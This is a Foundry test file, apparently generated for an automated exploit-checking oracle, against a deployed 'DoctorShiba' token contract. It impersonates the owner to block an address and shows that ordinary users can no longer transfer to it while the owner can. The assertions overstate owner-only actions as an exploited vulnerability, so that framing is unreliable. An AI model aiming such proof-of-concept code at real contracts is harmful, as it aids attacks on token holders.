// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDoctorShiba {
    function owner() external view returns (address);
    function transfernewun(address _newun) external;
    function newun() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    address targetToBlock;
    address regularUser;
    IDoctorShiba ds;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        targetToBlock = address(0x1234567890123456789012345678901234567890);
        vm.label(targetToBlock, "Blocked Address");

        // Get some DS tokens for testing
        ds = IDoctorShiba(TARGET);
        owner = ds.owner();
        vm.label(owner, "Contract Owner");

        // Give some tokens to a regular user for testing transfers
        regularUser = address(0x1111111111111111111111111111111111111111);
        deal(address(ds), regularUser, 1000 * 10**9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate owner and block target address
        vm.startPrank(owner);
        ds.transfernewun(targetToBlock);
        vm.stopPrank();

        // Step 2: Verify newun is set to target address
        address currentNewun = ds.newun();
        require(currentNewun == targetToBlock, "newun not set correctly");

        // Step 3: Demonstrate blocking - regular user cannot transfer to blocked address
        vm.startPrank(regularUser);
        // This should revert because recipient is newun and sender is not owner
        bool success = false;
        try ds.transfer(targetToBlock, 100 * 10**9) {
            success = true;
        } catch {
            success = false;
        }
        require(!success, "Regular user should not be able to transfer to blocked address");
        vm.stopPrank();

        // Step 4: Owner can still transfer to blocked address
        vm.startPrank(owner);
        // Give owner some tokens first if needed
        uint256 ownerBalanceBefore = ds.balanceOf(owner);
        if (ownerBalanceBefore < 100 * 10**9) {
            ds.mint(owner, 1000 * 10**9);
        }

        // Transfer from owner to blocked address - should succeed
        ds.transfer(targetToBlock, 100 * 10**9);
        vm.stopPrank();

        // Verify the transfer succeeded
        uint256 blockedBalance = ds.balanceOf(targetToBlock);
        require(blockedBalance == 100 * 10**9, "Owner transfer to blocked address failed");

        // Final verification for oracle
        assertEq(currentNewun, targetToBlock, "Vulnerability exploited: newun set to target address");
        assertEq(ds.newun(), targetToBlock, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
